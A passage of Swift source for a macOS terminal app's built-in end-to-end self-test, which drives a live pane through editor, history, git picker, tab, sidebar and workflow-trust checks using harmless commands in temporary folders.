import AppKit
import GhosttyKit
import AnserCore

/// End-to-end check of the live app, for development:
///   ANSER_SELFTEST=/tmp/out.txt build/Anser.app/Contents/MacOS/Anser
/// Drives a real pane through the same code paths as typing and clicking,
/// writes PASS/FAIL lines, then quits. Its commands are removed from history.
enum SelfTest {
    private static var lines: [String] = []
    private static var out = ""

    static func runIfRequested() {
        guard let path = ProcessInfo.processInfo.environment["ANSER_SELFTEST"] else { return }
        out = path
        guard let pane = AppDelegate.shared.currentPane, let wc = pane.windowController else {
            check("window opened", false); finish(); return
        }
        Task { @MainActor in await run(pane, wc); finish() }
    }

    private static func check(_ name: String, _ ok: Bool, _ detail: String = "") {
        lines.append("\(ok ? "PASS" : "FAIL")  \(name)\(detail.isEmpty ? "" : "  — \(detail)")")
        // Memory: the highest seen since the previous check (memory.txt next to the results).
        memoryLog.append(String(format: "%5.0f MB peak · %5.0f MB now   %@", Double(memorySampler.takePeak()) / 1_048_576,
                                Double(MemoryUse.footprint().current) / 1_048_576, name))
    }
    private static var memoryLog: [String] = []
    private static let memorySampler = MemorySampler()

    private static func finish() {
        // Keep the user's history clean.
        let h = Services.shared.history
        for c in h.search("", scope: .all, limit: 100000).map(\.0.command)
        where c.contains("anser-selftest") || c.contains("ANSER_SELFTEST") {
            h.delete(command: c)
        }
        // End the test's shells (its own helper, never yours): the script may stop the app before it quits normally.
        if ProcessInfo.processInfo.environment["ANSER_SELFTEST_HOLD"] == nil { SessionHost.shared.request(["cmd": "endAll"], timeout: 1) }
        try? memoryLog.joined(separator: "\n").write(toFile: (out as NSString).deletingLastPathComponent + "/memory.txt", atomically: true, encoding: .utf8)
        try? lines.joined(separator: "\n").appending("\n").write(toFile: out, atomically: true, encoding: .utf8)
        // ANSER_SELFTEST_HOLD keeps the app open afterwards, for inspecting memory.
        if ProcessInfo.processInfo.environment["ANSER_SELFTEST_HOLD"] != nil { return }
        NSApp.terminate(nil)
    }

    @MainActor
    private static func wait(_ timeout: Double, _ cond: () -> Bool) async -> Bool {
        let start = Date()
        while !cond() {
            if Date().timeIntervalSince(start) > timeout { return false }
            try? await Task.sleep(nanoseconds: 50_000_000)
        }
        return true
    }

    /// Folder for UI snapshots, next to the results file.
    static var shotDir: String { (out as NSString).deletingLastPathComponent }

    @MainActor
    static func snap(_ pane: PaneView, _ name: String, full: Bool = false) {
        pane.snapshotBar(to: shotDir + "/bar-\(name).png", includeTerminalArea: full)
    }

    @MainActor
    static func snapView(_ v: NSView, _ name: String) {
        v.layoutSubtreeIfNeeded()
        guard let rep = v.bitmapImageRepForCachingDisplay(in: v.bounds) else { return }
        v.cacheDisplay(in: v.bounds, to: rep)
        try? rep.representation(using: .png, properties: [:])?.write(to: URL(fileURLWithPath: shotDir + "/\(name).png"))
    }

    @MainActor
    private static func sleep(_ s: Double) async { try? await Task.sleep(nanoseconds: UInt64(s * 1e9)) }

    /// Types text into the editor the way keystrokes do.
    @MainActor
    private static func type(_ pane: PaneView, _ text: String) {
        pane.window?.makeFirstResponder(pane.editor)
        for ch in text { pane.editor.insertText(String(ch), replacementRange: pane.editor.selectedRange()) }
    }

    @MainActor
    private static func run(_ pane: PaneView, _ wc: TerminalWindowController) async {
        let s = pane.session
        var ok = await wait(15) { s.integrated && s.atPrompt }
        check("shell hooks report a prompt", ok, "shell=\(s.env.shell)")
        guard ok else { return }
        check("editor is usable at the prompt", pane.editorUsable)
        snap(pane, "empty")

        // Run a command and copy its output.
        let tmp = NSTemporaryDirectory() + "anser-selftest"
        try? FileManager.default.createDirectory(atPath: tmp, withIntermediateDirectories: true)
        pane.run("cd \(ShellLexer.escape(tmp)) && echo anser-ok-$((6*7)) && printf 'line2\\nline3\\n'")
        ok = await wait(10) { s.atPrompt && s.blocks.count >= 1 }
        check("command ran, exit code recorded", ok && s.blocks.last?.exitCode == 0)
        check("cwd followed cd", s.cwd.hasSuffix("anser-selftest"), s.cwd)
        check("saved to history db", Services.shared.history.entries(session: s.id, limit: 3).first?.command.contains("anser-ok") == true)
        await sleep(0.3)
        let output = pane.lastOutput() ?? "<nil>"
        check("copy last output", output.trimmingCharacters(in: .whitespacesAndNewlines) == "anser-ok-42\nline2\nline3", output.replacingOccurrences(of: "\n", with: "⏎"))

        // One input: the shell's waiting prompt is hidden; commands stay as "❯ command".
        let vp = pane.surfaceView.viewportText() ?? ""
        check("commands show as ❯ lines in scrollback", vp.contains("❯ cd ") && vp.contains("anser-ok-42"),
              vp.split(separator: "\n").suffix(4).joined(separator: " ⏎ "))
        let lastLine = vp.split(separator: "\n", omittingEmptySubsequences: false).last(where: { !$0.trimmingCharacters(in: .whitespaces).isEmpty }) ?? ""
        check("no duplicate prompt waiting in the terminal", lastLine.contains("line3"), String(lastLine))
        pane.layoutSubtreeIfNeeded()
        check("editor sits right under the output", pane.followTop != nil, "followTop=\(pane.followTop.map { "\(Int($0))" } ?? "bottom")")
        snap(pane, "follow", full: true)
        check("no \u{201C}Last login\u{201D} line", !(pane.surfaceView.viewportText() ?? "").contains("Last login"))

        // Typing: ghost text, popup, history navigation.
        type(pane, "cd \(tmp) && echo anser-o")
        check("gray history suggestion appears", !pane.editor.ghostSuffix.isEmpty, pane.editor.ghostSuffix)
        pane.editor.clear()
        type(pane, "git ch")
        ok = await wait(3) { pane.editor.popup.isVisible }
        check("completion popup opens while typing", ok, pane.editor.popup.selected?.insert ?? "-")
        snap(pane, "typing")
        pane.editor.popup.snapshot(to: shotDir + "/popup.png")
        pane.editor.doCommand(by: #selector(NSResponder.insertTab(_:)))
        check("Tab accepts the completion", pane.editor.string.hasPrefix("git checkout"), pane.editor.string)
        pane.editor.clear()
        pane.editor.doCommand(by: #selector(NSResponder.moveUp(_:)))
        check("↑ recalls the last command", pane.editor.string.contains("anser-ok"), pane.editor.string)
        pane.editor.clear()

        // Editor features.
        let ed = pane.editor
        type(pane, "echo \"hi")
        check("quotes auto-close", ed.string == "echo \"hi\"", ed.string)
        type(pane, "\"")
        check("typing the closing quote steps over it", ed.string == "echo \"hi\"" && ed.selectedRange().location == ed.string.utf16.count)
        ed.clear()
        ed.setCommand("echo hello")
        ed.setSelectedRange(NSRange(location: 5, length: 5))
        type(pane, "'")
        check("typing a quote wraps the selection", ed.string == "echo 'hello'", ed.string)
        ed.clear()
        type(pane, "(")
        ed.deleteBackward(nil)
        check("backspace removes an empty pair", ed.string.isEmpty, ed.string)
        ed.setCommand("cat src/main.swift --flag=1")
        let dbl = ed.selectionRange(forProposedRange: NSRange(location: 8, length: 0), granularity: .selectByWord)
        check("double-click selects a whole path", (ed.string as NSString).substring(with: dbl) == "src/main.swift")
        ed.setCommand("ls -la | grep foo && echo done")
        ed.setSelectedRange(NSRange(location: 15, length: 0))
        ed.expandSelection()
        let e1 = (ed.string as NSString).substring(with: ed.selectedRange())
        ed.expandSelection()
        let e2 = (ed.string as NSString).substring(with: ed.selectedRange())
        ed.expandSelection()
        let e3 = (ed.string as NSString).substring(with: ed.selectedRange())
        check("⌥↑ grows the selection word → command → line", e1 == "foo" && e2 == "grep foo" && e3 == ed.string, "\(e1) | \(e2) | \(e3)")
        ed.shrinkSelection()
        check("⌥↓ shrinks it back", (ed.string as NSString).substring(with: ed.selectedRange()) == "grep foo")

        ed.setCommand("git commit -m ")
        pane.updateHint()
        check("hint explains what comes next", pane.hintText.contains("‹message›"), pane.hintText)
        snap(pane, "hint")

        let longCmd = "cat access.log | grep -v healthcheck | sort --reverse --numeric-sort | head -n 20"
        ed.setCommand(longCmd)
        ed.toggleFormat()
        check("split long command into lines", ed.logicalLineCount >= 4, "\(ed.logicalLineCount) lines")
        pane.layoutSubtreeIfNeeded()
        snap(pane, "multiline")
        pane.toggleExpanded()
        pane.layoutSubtreeIfNeeded()
        snap(pane, "expanded")
        pane.toggleExpanded()
        // Expanding with a short (or empty) command must still open a tall editor.
        let splitText = ed.string
        ed.clear()
        pane.layoutSubtreeIfNeeded()
        let small = pane.editorAreaHeight
        pane.toggleExpanded()
        let tall = pane.editorAreaHeight
        snap(pane, "expanded-empty")
        check("expand opens a tall editor even when empty", tall >= small * 5, String(format: "%.0f → %.0f pt", small, tall))
        ed.doCommand(by: #selector(NSResponder.cancelOperation(_:)))
        pane.layoutSubtreeIfNeeded()
        check("Esc shrinks it back", !pane.editorExpanded && pane.editorAreaHeight == small, String(format: "%.0f pt", pane.editorAreaHeight))
        ed.setCommand(splitText)
        ed.toggleFormat()
        check("join lines back", ed.string == longCmd, ed.string)
        ed.clear()
        snap(pane, "empty-focused")

        // Round trip through an external editor (a fake one that edits the file).
        let fake = tmp + "/fake-editor.sh"
        try? "#!/bin/sh\nsed -i '' 's/hello/world/' \"$1\"\n".write(toFile: fake, atomically: true, encoding: .utf8)
        chmod(fake, 0o755)
        pane.run("export VISUAL=\(fake) # anser-selftest")
        _ = await wait(10) { s.blocks.last?.command.hasPrefix("export VISUAL") == true && s.atPrompt }
        ed.setCommand("echo hello")
        pane.editInExternalEditor()
        ok = await wait(10) { ed.string == "echo world" }
        check("edit in $EDITOR comes back into the editor", ok, ed.string)
        ed.clear()

        // Vi/emacs-safe clearing of text typed straight into the shell.
        pane.surfaceView.sendText("garbage-text ")
        pane.noteRawTyping()
        await sleep(0.2)
        pane.run("echo clean-ok # anser-selftest")
        ok = await wait(10) { s.blocks.last?.command == "echo clean-ok # anser-selftest" }
        check("raw shell text cleared before running", ok, s.blocks.last?.command ?? "-")

        // History filter.
        pane.run("export ANSER_SELFTEST_TOKEN=abc")
        _ = await wait(10) { s.blocks.last?.command.hasPrefix("export") == true }
        let saved = Services.shared.history.search("ANSER_SELFTEST_TOKEN", scope: .all).count
        check("secret-looking command kept out of history", saved == 0)

        pane.run("false # anser-selftest")
        _ = await wait(10) { s.blocks.last?.command == "false # anser-selftest" }
        check("failed exit code tracked", s.blocks.last?.exitCode == 1)

        // Failure help.
        check("failed command offers Edit & retry", pane.fixChipText == "Edit & retry", pane.fixChipText)
        pane.run("gti status # anser-selftest")
        ok = await wait(10) { s.blocks.last?.command.hasPrefix("gti") == true && s.atPrompt }
        check("typo gets a fix suggestion", pane.fixCommand == "git status # anser-selftest", pane.fixCommand ?? "-")
        snap(pane, "fix")
        pane.applyFix()
        check("clicking the fix puts it in the editor", pane.editor.string == "git status # anser-selftest", pane.editor.string)
        pane.editor.clear()

        // Git: a throwaway repo with a branch and a changed file.
        pane.run("git init -q -b main 2>/dev/null; git -c user.email=t@t -c user.name=t commit -q --allow-empty -m init; git branch -f feature/demo; touch \"new file.txt\" # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.hasPrefix("git init") == true }
        ok = await wait(5) { s.gitChangeCount >= 1 }
        pane.layoutSubtreeIfNeeded()
        check("changes chip shows changed files", ok && pane.changesChipVisible, "\(s.gitChangeCount) changed, branch \(s.gitBranch ?? "-")")
        snap(pane, "git")
        func openPicker() -> PickerPanel? { NSApp.windows.compactMap { $0 as? PickerPanel }.first { $0.isVisible } }
        func openPickerTitles() -> [String] { openPicker()?.itemTitles ?? [] }
        func closePickers() { NSApp.windows.compactMap { $0 as? PickerPanel }.forEach { $0.close() } }
        wc.showChanges(for: pane)
        ok = await wait(3) { openPicker() != nil }
        check("changed files list opens", ok)
        if let p = openPicker(), let v = p.contentView { snapView(v, "picker-changes"); p.close() }
        // A remote with a branch someone else pushed after our last fetch.
        let remoteDir = NSTemporaryDirectory() + "anser-selftest-remote-\(UUID().uuidString.prefix(8))"
        _ = await ScriptRunner.shared.run("""
            set -e; mkdir -p \(remoteDir); git init -q --bare -b main \(remoteDir)/origin.git
            git remote add origin \(remoteDir)/origin.git; git push -q origin main feature/demo
            git clone -q \(remoteDir)/origin.git \(remoteDir)/other; cd \(remoteDir)/other
            git switch -q -c pushed-later; git -c user.email=t@t -c user.name=t commit -q --allow-empty -m later; git push -q origin pushed-later
            """, cwd: tmp, env: s.env, timeout: 20)
        defer { try? FileManager.default.removeItem(atPath: remoteDir) }
        wc.showBranchSwitcher(for: pane)
        ok = await wait(3) { openPicker() != nil }
        check("branch switcher opens", ok)
        if let p = openPicker() {
            ok = await wait(4) { p.previewString.contains("init") }
            check("branch preview shows commits with friendly times", ok && !p.previewString.contains("seconds ago"),
                  String(p.previewString.prefix(60)))
            p.selectScope(2)
            ok = await wait(15) { p.itemTitles.contains("origin/pushed-later") }
            check("remote branches listed, including ones only a fetch finds", ok && p.itemTitles.contains("origin/main"),
                  p.itemTitles.joined(separator: ", "))
            p.setQuery("origin/push")
            check("typing a remote name doesn't offer to create a branch", !p.itemTitles.contains { $0.hasPrefix("Create branch") },
                  p.itemTitles.joined(separator: ", "))
            p.setQuery("")
            p.selectScope(0)
            if let v = p.contentView { snapView(v, "picker-branches") }
            p.close()
        }
        try? FileManager.default.createDirectory(atPath: tmp + "/folders/alpha/beta/gamma-target", withIntermediateDirectories: true)
        TerminalWindowController.resetFolderScanCache()
        wc.showFolderJumper(for: pane)
        ok = await wait(3) { openPicker() != nil }
        check("folder jumper opens", ok)
        if let p = openPicker() {
            p.setQuery("gamma")
            ok = await wait(5) { p.refresh(); return p.itemTitles.first?.hasSuffix("alpha/beta/gamma-target") == true }
            check("folder search finds a folder 3 levels down", ok, p.itemTitles.prefix(2).joined(separator: " | "))
            let menu = p.actionTitles(forRow: 0)
            check("right-click a folder: cd, new tab, new window, Finder, copy path (then editor, Quick Look, files)",
                  Array(menu.prefix(5)) == ["cd Here", "New Tab Here", "New Window Here", "Open in Finder", "Copy Path"] && menu.contains("Files"), menu.joined(separator: ", "))
            check("buttons open the selected folder", p.buttonTitles.contains("New Tab Here") && p.buttonTitles.contains("Open in Finder"),
                  p.buttonTitles.joined(separator: ", "))
            if let v = p.contentView { snapView(v, "picker-folder-actions") }
            p.setQuery("~/Desktop")
            check("typed path is offered directly", p.itemTitles.first == "~/Desktop" || !FileManager.default.fileExists(atPath: NSHomeDirectory() + "/Desktop"),
                  p.itemTitles.first ?? "-")
            p.setQuery("gam")
            await sleep(0.3)
            if let v = p.contentView { snapView(v, "picker-folders") }
            p.close()
        }

        // Help.
        ShortcutsPanel.toggle(over: wc.window)
        await sleep(0.3)
        check("shortcuts sheet opens", ShortcutsPanel.shared?.isVisible == true)
        if let v = ShortcutsPanel.shared?.contentView { snapView(v, "shortcuts") }
        ShortcutsPanel.shared?.close()
        pane.showWelcome()
        check("welcome card shows", pane.welcomeVisible)
        snap(pane, "welcome", full: true)
        pane.dismissWelcome()

        // Find in scrollback.
        pane.showFind()
        pane.surfaceView.binding("search:anser-ok")
        ok = await wait(3) { pane.searchTotal >= 1 }
        check("find in scrollback", ok && pane.findVisible, "matches=\(pane.searchTotal)")
        pane.hideFind()

        // Running-process detection (close confirmation) and full-screen apps.
        pane.run("sleep 30 # anser-selftest")
        ok = await wait(5) { pane.hasRunningProcess }
        await sleep(0.3)
        check("Stop button while running", pane.stopVisible)
        snap(pane, "running")
        check("knows a program is running", ok)
        pane.sendControl("c")
        _ = await wait(5) { s.atPrompt }
        check("Ctrl-C reaches the program", s.atPrompt)

        pane.run("top -l 1 -n 0 >/dev/null # anser-selftest")
        ok = await wait(5) { pane.isFullscreenProgram }
        check("bar hides for full-screen programs", ok)
        _ = await wait(10) { s.atPrompt }
        check("bar returns at the prompt", !pane.isFullscreenProgram)

        // Turning the editor off brings back the shell's own prompt.
        pane.toggleEditor()
        await sleep(0.6)
        let vpOff = pane.surfaceView.viewportText() ?? ""
        let offLast = vpOff.split(separator: "\n").last(where: { !$0.trimmingCharacters(in: .whitespaces).isEmpty }) ?? ""
        check("editor off shows the shell's prompt", !offLast.contains("anser-selftest") && !offLast.isEmpty, String(offLast))
        pane.toggleEditor()
        await sleep(0.4)
        check("editor back on", pane.editorUsable)

        // Tabs.
        wc.addTab(cwd: s.cwd)
        check("new tab opens and is selected", wc.tabs.count == 2 && wc.selectedIndex == 1)
        let tabPane = wc.focusedPane!
        ok = await wait(15) { tabPane.session.integrated && tabPane.session.atPrompt }
        check("new tab gets its own shell", ok && tabPane !== pane)
        wc.renameTab(1, to: "API server")
        wc.setTabColor(1, "green")
        check("rename tab", wc.title(of: wc.tabs[1]) == "API server" && wc.tabBar.itemViews[1].title == "API server")
        // Clicks in the title-bar area must reach the tab, not the window frame.
        if let item = wc.tabBar.itemViews.first, let frameView = wc.window?.contentView?.superview {
            let p = frameView.convert(NSPoint(x: item.bounds.midX, y: item.bounds.midY), from: item)
            let hit = frameView.hitTest(p)
            check("tab bar receives clicks", hit === item || hit?.isDescendant(of: item) == true, String(describing: Swift.type(of: hit as Any)))
        }
        snapView(wc.tabBar, "tabbar")
        wc.selectTab(0)
        check("switch tabs", wc.focusedPane === pane && pane.window != nil && !pane.isHiddenOrHasHiddenAncestor)
        check("tabs saved with names and colors", wc.snapshotTabs().last?.title == "API server" && wc.snapshotTabs().last?.color == "green")
        wc.closeTab(1)
        check("close tab", wc.tabs.count == 1)

        // Rearranging tabs: drag with real mouse events, keyboard, new window.
        wc.renameTab(0, to: "A")
        wc.addTab(cwd: s.cwd); wc.renameTab(1, to: "B")
        wc.addTab(cwd: s.cwd); wc.renameTab(2, to: "C")
        wc.tabBar.layoutSubtreeIfNeeded()
        func order() -> String { wc.tabs.map { wc.title(of: $0) }.joined() }
        if let w = wc.window, let a = wc.tabBar.itemViews.first, let c = wc.tabBar.itemViews.last {
            func ev(_ t: NSEvent.EventType, _ p: NSPoint) -> NSEvent {
                NSEvent.mouseEvent(with: t, location: p, modifierFlags: [], timestamp: ProcessInfo.processInfo.systemUptime,
                                   windowNumber: w.windowNumber, context: nil, eventNumber: 0, clickCount: 1, pressure: t == .leftMouseUp ? 0 : 1)!
            }
            let start = a.convert(NSPoint(x: a.bounds.midX, y: a.bounds.midY), to: nil)
            let end = c.convert(NSPoint(x: c.bounds.maxX - 4, y: c.bounds.midY), to: nil)
            w.sendEvent(ev(.leftMouseDown, start))
            for i in 1...12 {
                let t = CGFloat(i) / 12
                w.sendEvent(ev(.leftMouseDragged, NSPoint(x: start.x + (end.x - start.x) * t, y: start.y)))
                await sleep(0.02)
            }
            snapView(wc.tabBar, "tabbar-dragging")
            w.sendEvent(ev(.leftMouseUp, end))
            await sleep(0.4)
            check("drag a tab to a new position", order() == "BCA", order())
        }
        wc.moveSelectedTab(by: -1)
        check("move tab with ⌥⌘←", order() == "BAC", order())
        snapView(wc.tabBar, "tabbar-3")
        let movedPane = wc.panes(inTab: 2).first
        _ = await wait(15) { movedPane?.session.integrated == true }
        wc.moveTabToNewWindow(2)
        await sleep(0.4)
        let newWC = movedPane?.windowController
        check("move tab to a new window", order() == "BA" && newWC !== wc && newWC?.tabs.count == 1 && movedPane?.session.integrated == true,
              "order=\(order()) newWindow=\(newWC !== wc) tabs=\(newWC?.tabs.count ?? -1) integrated=\(movedPane?.session.integrated == true)")
        newWC?.forceClose()
        // Keep only the tab holding the main test pane.
        while wc.tabs.count > 1, let i = wc.tabs.firstIndex(where: { $0 !== wc.tab(for: pane) }) { wc.closeTab(i) }
        wc.selectTab(0)
        wc.renameTab(0, to: nil)

        // ---- UI round 3 ----
        // Command blocks drawn over the terminal.
        pane.blocksOverlay.refresh()
        let blocks = pane.blocksOverlay.blocks
        check("command blocks drawn beside output", blocks.count >= 3 && blocks.contains { ($0.info?.exitCode ?? 0) != 0 },
              "\(blocks.count) blocks, \(blocks.filter { ($0.info?.exitCode ?? 0) != 0 }.count) failed")
        if let last = blocks.last {
            pane.blocksOverlay.hover(at: NSPoint(x: 40, y: last.top + 4))
            snap(pane, "blocks", full: true)
            pane.blocksOverlay.hover(at: nil)
        }
        let marks = blocks.compactMap { pane.blocksOverlay.resultMark($0) }
        check("failures show ✗, slow commands ✓, quick ones stay quiet",
              marks.contains { $0.hasPrefix("✓ ") && $0.hasSuffix("s") && !$0.hasSuffix("ms") } && marks.contains { $0.hasPrefix("✗ exit") }
                && !marks.contains { $0.hasPrefix("✓ ") && $0.hasSuffix("ms") },
              marks.joined(separator: " | "))
        snap(pane, "blocks-marks", full: true)


        // Hover strip: Explain only on failed commands; output opens in its own window.
        if let failed = pane.blocksOverlay.blocks.first(where: { !$0.running && ($0.info?.exitCode ?? 0) != 0 }),
           let good = pane.blocksOverlay.blocks.first(where: { !$0.running && $0.info?.exitCode == 0 && $0.blockIndex != nil }) {
            pane.blocksOverlay.hover(at: NSPoint(x: 40, y: failed.top + 4))
            let onFailed = pane.blocksOverlay.visibleStripActions
            pane.blocksOverlay.hover(at: NSPoint(x: 40, y: good.top + 4))
            let onGood = pane.blocksOverlay.visibleStripActions
            pane.blocksOverlay.hover(at: nil)
            check("hover strip offers Explain on failed commands only",
                  onFailed.contains { $0.hasPrefix("Explain") } && !onGood.contains { $0.hasPrefix("Explain") } && onGood.contains { $0.contains("own window") },
                  "\(onFailed.count) vs \(onGood.count)")
            wc.showOutputViewer(for: pane, block: good.blockIndex!)
            let viewer = OutputViewer.openViewers.last
            check("output opens in its own window", viewer?.isVisible == true && viewer?.text.isEmpty == false, viewer?.title ?? "none")
            if let v = viewer?.contentView { snapView(v, "output-viewer") }
            viewer?.close()
        } else {
            check("hover strip offers Explain on failed commands only", false, "need a failed and a successful block")
        }

        // ⌘-click a path in output (recorded, not launched, in tests).
        try? "a\nb\nc\n".write(toFile: tmp + "/app.swift", atomically: true, encoding: .utf8)
        pane.run("echo 'app.swift:3:1: error: expected expression' # anser-selftest")
        _ = await wait(10) { s.blocks.last?.command.contains("app.swift") == true && s.atPrompt }
        await sleep(0.3)
        let opened = pane.openLink("app.swift")
        check("⌘-click opens file at its line", opened && pane.lastOpenedLink?.line == 3 && pane.lastOpenedLink?.path.hasSuffix("/app.swift") == true,
              pane.lastOpenedArgv.joined(separator: " "))

        // Completion docs beside the popup.
        type(pane, "git com")
        ok = await wait(3) { pane.editor.popup.isVisible }
        // Skip past history matches to a documented subcommand.
        for _ in 0..<6 where pane.editor.popup.selected?.kind == .history { pane.editor.popup.move(1) }
        await sleep(0.2)
        check("completion docs panel shows", ok && pane.editor.popup.docsVisible, pane.editor.popup.selected?.insert ?? "-")
        pane.editor.popup.snapshotDocs(to: shotDir + "/docs.png")
        pane.editor.popup.snapshot(to: shotDir + "/popup-docs.png")
        pane.editor.clear()

        // Picker previews (changed files → diff / new file contents).
        wc.showChanges(for: pane)
        ok = await wait(3) { NSApp.windows.contains { ($0 as? PickerPanel)?.isVisible == true } }
        let cp = NSApp.windows.compactMap { $0 as? PickerPanel }.first { $0.isVisible }
        ok = await wait(3) { !(cp?.previewString.isEmpty ?? true) }
        check("picker shows a preview", ok, String((cp?.previewString ?? "").prefix(40)).replacingOccurrences(of: "\n", with: " ⏎ "))
        if let v = cp?.contentView { snapView(v, "picker-preview") }
        cp?.close()

        // Status row folds its buttons on a narrow window.
        let savedFrame = wc.window!.frame
        wc.window!.setFrame(NSRect(x: savedFrame.minX, y: savedFrame.minY, width: 420, height: savedFrame.height), display: true)
        wc.window!.contentView?.layoutSubtreeIfNeeded()
        pane.layoutSubtreeIfNeeded()
        let actionTitles = pane.actionsMenu().items.filter { !$0.isSeparatorItem }.map(\.title)
        check("actions sit in one menu, with the sidebar toggle", pane.actionsMenuButtonVisible && actionTitles.count == 10 && actionTitles.contains("Save Command to Notebook") && actionTitles.contains("Deep Clean…")
                && actionTitles.last == "Show Sidebar", actionTitles.joined(separator: ", "))
        snap(pane, "narrow")
        wc.window!.setFrame(savedFrame, display: true)
        pane.layoutSubtreeIfNeeded()
        check("actions menu shows shortcuts", pane.actionsMenu().items.first?.keyEquivalent == "r")

        // Split chrome: headers, dimming, zoom.
        wc.split(pane, vertical: true)
        let other = wc.allPanes.first { $0 !== pane }!
        _ = await wait(15) { other.session.atPrompt }
        pane.focus()
        await sleep(0.2)
        check("split panes get headers", pane.showsHeader && other.showsHeader)
        check("inactive pane is dimmed", !pane.dimmed && other.dimmed)
        snap(pane, "split-focused", full: true)
        wc.toggleZoom(pane)
        await sleep(0.2)
        check("zoom shows one pane full size", pane.zoomed && pane.frame.width > wc.window!.frame.width * 0.9)
        wc.toggleZoom(pane)
        await sleep(0.2)
        check("unzoom restores the split", !pane.zoomed && wc.allPanes.count == 2)
        wc.close(other)

        // Tab activity: a command finishing in a background tab.
        wc.addTab(cwd: s.cwd)
        let bg = wc.focusedPane!
        _ = await wait(15) { bg.session.atPrompt }
        bg.run("sleep 1; false # anser-selftest")
        _ = await wait(3) { bg.session.running != nil }
        wc.selectTab(0)
        check("background tab shows it's running", wc.activity(of: wc.tabs[1]) == .running)
        snapView(wc.tabBar, "tabbar-activity-running")
        _ = await wait(10) { bg.session.atPrompt && bg.session.running == nil }
        await sleep(0.2)
        check("background tab shows it failed", wc.activity(of: wc.tabs[1]) == .failed)
        snapView(wc.tabBar, "tabbar-activity-failed")
        wc.selectTab(1)
        check("visiting the tab clears it", wc.activity(of: wc.tabs[1]) == .idle)
        wc.closeTab(1)
        wc.selectTab(0)

        // Many tabs: overflow menu.
        for _ in 0..<11 { wc.addTab(cwd: s.cwd) }
        wc.tabBar.layoutSubtreeIfNeeded()
        check("many tabs get an overflow menu", wc.tabBar.isCrowded, "\(wc.tabs.count) tabs")
        snapView(wc.tabBar, "tabbar-crowded")
        while wc.tabs.count > 1, let i = wc.tabs.firstIndex(where: { $0 !== wc.tab(for: pane) }) { wc.closeTab(i) }
        wc.selectTab(0)

        // The Window menu lists exactly this window's tabs.
        wc.addTab(cwd: s.cwd)
        wc.selectTab(0)
        if let menu = NSApp.windowsMenu, let app = NSApp.delegate as? AppDelegate {
            app.menuNeedsUpdate(menu)
            let tabItems = menu.items.filter { $0.action == #selector(AppDelegate.selectTabN(_:)) }
            check("Window menu lists only the open tabs", tabItems.count == 2 && tabItems.first?.state == .on
                    && tabItems.map(\.keyEquivalent) == ["1", "2"],
                  tabItems.map { "\($0.title) ⌘\($0.keyEquivalent)" }.joined(separator: ", "))
        }
        wc.closeTab(1)
        wc.selectTab(0)

        // Sidebar, opened with the tab-bar button.
        wc.tabBar.layoutSubtreeIfNeeded()
        let sbFrame = wc.tabBar.sidebarButtonFrame
        let firstTab = wc.tabBar.frameForTab(0, count: wc.tabs.count)
        check("sidebar button sits before the tabs", sbFrame.width > 0 && sbFrame.maxX <= firstTab.minX, "\(sbFrame) vs \(firstTab)")
        wc.tabBar.clickSidebarButton()
        ok = await wait(5) { wc.sidebar.rowCount > 3 }
        check("sidebar lists git changes and folders", ok, "\(wc.sidebar.rowCount) rows, frame \(wc.sidebar.frame)")
        await sleep(0.5)
        wc.window?.contentView?.layoutSubtreeIfNeeded()
        snapView(wc.sidebar, "sidebar")
        check("sidebar headers show counts", wc.sidebar.sectionTitles.first?.hasPrefix("GIT · ") == true, wc.sidebar.sectionTitles.joined(separator: ", "))
        let rowsOpen = wc.sidebar.rowCount
        wc.sidebar.toggleSection("Git")
        check("sidebar sections fold", wc.sidebar.rowCount < rowsOpen, "\(rowsOpen) → \(wc.sidebar.rowCount)")
        wc.sidebar.toggleSection("Git")
        wc.tabBar.clickSidebarButton()
        await sleep(0.3)
        check("sidebar button hides it again", !wc.sidebarVisible)

        // ---- Workflows & export ----
        let wfDir = URL(fileURLWithPath: tmp).appendingPathComponent(".anser/workflows")
        try? FileManager.default.removeItem(at: wfDir)
        try? WorkflowStore.save(Workflow(name: "Greet and count", description: "Says hello, then counts files",
                                         steps: ["echo hello {{who:world}} # anser-selftest", "ls | wc -l"],
                                         params: [.init(name: "who", options: ["world", "team"])]), to: wfDir)
        let wfs = WorkflowStore.load(cwd: s.cwd)
        let wf = wfs.first { $0.name == "Greet and count" }
        check("project workflow is found", wf?.source == .project && wf?.allParams.first?.options?.count == 2)
        wc.showWorkflows(for: pane)
        ok = await wait(3) { NSApp.windows.contains { ($0 as? PickerPanel)?.isVisible == true } }
        if let p = NSApp.windows.compactMap({ $0 as? PickerPanel }).first(where: { $0.isVisible }) {
            _ = await wait(3) { !p.previewString.isEmpty }
            check("workflow picker shows steps", p.previewString.contains("1  echo hello"), String(p.previewString.prefix(60)).replacingOccurrences(of: "\n", with: " ⏎ "))
            check("parameters show as chips, trust is explained", p.previewString.contains(" who ") && p.previewString.lowercased().contains("trusted"))
            if let v = p.contentView { snapView(v, "picker-workflows") }
            p.close()
        }
        if let wf {
            let form = wc.makeParameterForm(wf)
            snapView(form.view, "workflow-form")
            check("parameter form uses the options", form.values()["who"] == "world")
            // Project workflows need trust before they run.
            WorkflowTrust().forget(wf)
            check("project workflow starts untrusted", !WorkflowTrust().isTrusted(wf))
            let n0 = s.blocks.count
            wc.runWorkflow(wf, values: ["who": "team"], in: pane)
            await sleep(1.5)
            check("untrusted workflow does not run", s.blocks.count == n0 && s.atPrompt)
            check("trust prompt lists the steps", wc.trustAlert(wf).informativeText.contains("1. echo hello"))
            WorkflowTrust().trust(wf)
            wc.runWorkflow(wf, values: ["who": "team"], in: pane)
            ok = await wait(10) { s.blocks.last?.command.contains("echo hello team") == true && s.atPrompt }
            await sleep(0.3)
            check("workflow runs its steps", ok && s.blocks.last?.exitCode == 0, s.blocks.last?.command ?? "-")
            if let f = wf.file, var text = try? String(contentsOf: f, encoding: .utf8) {
                text = text.replacingOccurrences(of: "ls | wc -l", with: "ls | wc -l # changed")
                try? text.write(to: f, atomically: true, encoding: .utf8)
                let changed = WorkflowStore.load(cwd: s.cwd).first { $0.name == "Greet and count" }
                check("changing the file asks for trust again", changed.map { !WorkflowTrust().isTrusted($0) } == true)
            }
        }
        // Every command's saved output belongs to that command.
        let mismatched = s.blocks.filter { b in
            guard let out = b.output, !out.isEmpty else { return false }
            if b.command.hasPrefix("echo clean-ok") { return !out.contains("clean-ok") }
            if b.command.contains("echo anser-ok") { return !out.contains("anser-ok-42") }
            if b.command.hasPrefix("echo hello team") { return !out.contains("hello team") }
